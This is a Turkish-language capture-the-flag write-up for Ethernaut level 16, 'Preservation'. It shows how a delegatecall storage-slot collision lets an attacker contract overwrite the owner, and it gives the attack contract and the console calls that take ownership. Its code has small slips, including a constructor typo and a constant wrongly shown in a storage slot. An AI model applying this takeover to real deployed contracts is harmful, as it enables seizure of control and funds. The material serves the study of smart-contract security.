# ETHERNAUT SORU 16: PRESERVATION

>This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.
>
>The goal of this level is for you to claim ownership of the instance you are given.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
	// public library contracts
	address public timeZone1Library;
	address public timeZone2Library;
	address public owner;
	uint256 storedTime;
	// Sets the function signature for delegatecall
	bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
	constructor(address _timeZone1LibraryAddress, address_ timeZone2LibraryAddress) {
	    timeZone1Library = _timeZone1LibraryAddress;
	    timeZone2Library = _timeZone2LibraryAddress;
	    owner = msg.sender;
	}

	// set the time for timezone 1
	function setFirstTime(uint256 _timeStamp) public {
	    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
	}

	// set the time for timezone 2
	function setSecondTime(uint256 _timeStamp) public {
	    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
	}
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;
    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

Bu sorunun çözümünde `delegatecall` fonksiyonunun yanlış bir şekilde uygulanmış olmasından yararlanılacaktır. `delegatecall`, `call` fonksiyonu gibi bir kontraktın başka bir kontrakttaki komutları çağırmasına yardımcı olur. Bu iki fonksiyonun arasındaki fark ise `delegatecall` gerçekleştirilirken çağrılan değil çağıran kontraktın hafızasının kullanılmasıdır.

Soruda kullanılan `delegatecall`, `Preservation` kontraktındaki `storedTime` değişkenini `LibraryContract` aracılığıyla değiştirmek için kullanılmıştır. Ancak `delegatecall` bunu doğru bir şekilde yerine getirmemektedir. Çünkü bu çağrı gerçekleştirilirken değişkenlere isimlerine göre değil kontraktın depolamasında konuma göre erişilir.

Kontraktlardaki depolama aşadaki gibidir.

| -- | Preservation | LibraryContract |
| :---: | :---: | :---: | 
| #0 | ```address public timeZone1Library``` | ```uint256 storedTime``` | 
| #1 | ```address public timeZone2Library``` | --- |
| #2 | ```address public owner``` | --- |
| #3 | ```uint256 storedTime``` | --- |
| #4 | ```bytes4 constant setTimeSignature``` | --- |

Değişkenlerin her iki kontraktaki hanelerine bakıldığı zaman `LibraryContract` üzerinde yer alan `storedTime` değişkeninin `Preservation` kontraktı üzerinde `storedTime` değil `timeZone1Library` ile eşleştiği görülür. Bu yüzden `Preservation` kontraktının `setFirstTime` veya `setSecondTime` fonksiyonları çağrılarak `timeZone1Library` yerine yalancı bir kontrakt şu şekilde yerleştirilebilir:

```javascript
> await contract.setFirstTime(fake_contract_address)
```

Bu saldırıda kullanılan kontrakt aşağıdaki gibidir.

```solidity
contract attack {
	address public add0;
	address public add1;
	address public add2;
	
	function setTime(uint256 _time) public {
		add2=address(0); // kendi adresiniz
	}
}
```

Bu kontraktın depolaması `Preservation` ile kıyaslandığı zaman `owner` ile `add2` değişkenlerinin eşleştiği görülebilir.

| -- | Preservation | attack |
| :---: | :---: | :---: | 
| #0 | ```address public timeZone1Library``` | ```address public add0``` | 
| #1 | ```address public timeZone2Library``` | ```address public add1``` |
| #2 | ```address public owner``` | ```address public add2``` |
| #3 | ```uint256 storedTime``` | --- |
| #4 | ```bytes4 constant setTimeSignature``` | --- |

Bu yüzden `setFirstTime` komutunu tekrardan çalıştırmak soruyu çözecektir.

```javascript
> await contract.setFirstTime(0)
```